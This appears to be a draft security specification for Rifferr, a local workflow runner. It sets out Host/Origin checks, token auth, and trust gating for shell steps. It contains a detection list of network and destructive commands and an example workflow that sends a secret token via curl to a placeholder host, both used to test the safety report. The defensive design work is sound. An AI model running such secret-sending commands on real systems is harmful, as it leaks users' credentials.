# F-SECURITY: Request checks, local token, remote auth and workflow trust (M0 slice)
Status: Draft
Milestone: M0

## Context
Rifferr can run shell commands, so the threat is who can trigger it: any web
page in the user's browser (cross-site requests, DNS rebinding) and other
local users (architecture §8 "Security"; AGENTS.md non-negotiable 5). These
checks exist before the first mutating endpoint ships. M0 includes the
request checks, the local token, the non-localhost refusal and a minimal
workflow trust gate; the full static safety report UI comes later.

The checks are plain ASGI middleware with no framework dependency, so they can
be built and tested before F-API, which mounts them on its app. Remote-mode
authentication (password, proxy header) arrives with Docker in F-PACKAGING (M5);
M0 only refuses to start without it.

## Behavior
- SECURITY-1: The server MUST bind to `127.0.0.1` by default.
- SECURITY-2: Requests whose `Host` header is not in the allowlist (`127.0.0.1:<port>`, `localhost:<port>`, `[::1]:<port>`, plus configured names) MUST get 400 and no other processing. This MUST stay on with `--no-auth`.
- SECURITY-3: Requests carrying an `Origin` header that is not the app's own origin MUST be rejected with 403; mutating requests (`POST`, `PUT`, `PATCH`, `DELETE`) without an `Origin` or matching `Sec-Fetch-Site: same-origin` MUST also be rejected, except webhook routes (M2) and requests with a valid bearer token from the CLI.
- SECURITY-4: Mutating endpoints MUST accept only `Content-Type: application/json` (415 otherwise).
- SECURITY-5: The server MUST send no CORS headers.
- SECURITY-6: At launch, the server MUST generate a random local token (≥ 32 bytes, `secrets.token_urlsafe`). `rifferr serve` opens `http://127.0.0.1:<port>/auth/exchange?token=…`; the app exchanges it for an `HttpOnly`, `SameSite=Strict` cookie named `rifferr_token_<port>` (browsers share localhost cookies across ports) and redirects (303) to a URL without the token. The exchange response MUST send `Cache-Control: no-store`.
- SECURITY-7: Every API route except the token exchange and health check MUST require the cookie or `Authorization: Bearer <token>` (for the CLI), unless `--no-auth` is given. Tokens MUST be compared in constant time (`hmac.compare_digest`). Host/Origin/JSON checks stay on with `--no-auth`.
- SECURITY-8: The token MUST be written to a file readable only by the user (mode 0600, user runtime dir) so `rifferr run` can talk to a running server, and MUST never be logged.
- SECURITY-9: Binding to any address other than loopback MUST refuse to start unless real auth is configured (username + password, or trusted reverse-proxy header with a configured proxy address). In M0 no real auth exists yet, so any non-loopback bind MUST refuse to start with a message pointing at the docs.
- SECURITY-10: Workflows MUST be trusted by content hash (SHA-256 of the file bytes) before any `shell` step (and later `python` actions) runs; workflows created in this install through the UI or CLI are trusted at save time; any edit changes the hash and resets trust. The server MUST check trust when a run is submitted, against the hash of the workflow text stored with the job (F-WORKER), and pass the result as the run's `trusted` flag; the worker runs that same text. Step types from installed plugins are outside this gate: installing a plugin is what trusts it.
- SECURITY-11: In M0, `rifferr validate` and the API's validate route MUST produce a static safety report listing every `shell` step's command, `shell: true` usage, network tools (`curl`, `wget`, `ssh`, `nc`, …), destructive commands (`rm`, `mv`, `chmod`, `chown`, `sudo`) found in argv, every secret a step exposes (`with.secrets`), and local scripts the workflow runs (argv paths starting with `./`, `../`, `~` or `/` that aren't system binaries), with a warning that trust covers the workflow text only (B-020).
- SECURITY-12: Trust MUST be granted only by an explicit user action (`rifferr trust <file>` or a UI confirm), never automatically for files that arrived from elsewhere (including the repo's `examples/`, which ship untrusted), and never by AI review.
- SECURITY-13: Every response MUST carry `Content-Security-Policy` with `frame-ancestors 'none'`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`, so pages like the trust confirmation can't be framed (clickjacking) and the token can't leak through `Referer`.

## Interfaces
- Middleware stack (outermost first): security headers → Host allowlist → Origin/fetch-site check → content-type check → auth. Pure ASGI (`rifferr.api.security`), no framework dependency.
- Routes: `GET /auth/exchange?token=…` (sets cookie, 303 to `/`), `GET /healthz` (no auth).
- Token file: `$XDG_RUNTIME_DIR/rifferr/<port>.token` (fallback: config dir, mode 0600).
- Trust store: app DB table `trusted_files(sha256, path_hint, trusted_at, trusted_by)`.

## Examples
- `curl -H 'Host: evil.example' http://127.0.0.1:8765/api/runs` → 400.
- Workflow with `with: { run: [curl, -d, "$RIFFERR_SECRET_TOKEN", https://x], secrets: [token] }` → report lists network tool `curl` and exposed secret `token`.
- Browser page on another origin POSTs JSON to `/api/runs` → 403.
- `rifferr serve --host 0.0.0.0` without auth config → exits non-zero: "binding to 0.0.0.0 requires authentication; see docs".
- Copy `examples/workflows/two-step.yaml` into the workflows dir, run it → shell step fails "workflow not trusted"; `rifferr trust` it → runs.

## Extensibility
Auth backends for remote mode (password, proxy header) are fixed in M0. The safety report's rule list is data, so it can grow without code changes to callers.

## Security & safety
This spec is the security baseline; loosening any rule needs the author's explicit OK (AGENTS.md).

## Non-goals
- Safety report UI and AI-assisted review (later).
- Remote-mode authentication (F-PACKAGING, M5); M0 only refuses non-loopback binds.
- Trust covering referenced scripts and rules files (B-020).
- User accounts beyond a single remote login.
- Webhook secrets (F-TRIGGERS, M2).

## Open questions
- ~~Remote mode in M0?~~ Resolved 2026-11-11 (author): refusal only; real auth with F-PACKAGING (SECURITY-9).
- ~~Ship `examples/` untrusted?~~ Resolved 2026-11-11 (author): yes (SECURITY-12).
- ~~400 or 421 for Host mismatch?~~ Resolved 2026-11-11 (author): 400 (SECURITY-2).

## Tasks
- [ ] security headers middleware
- [ ] host allowlist middleware
- [ ] origin / fetch-site middleware
- [ ] JSON-only middleware
- [ ] token generation, exchange, cookie, token file
- [ ] non-localhost refusal
- [ ] trust store + hash check in shell step
- [ ] static safety report
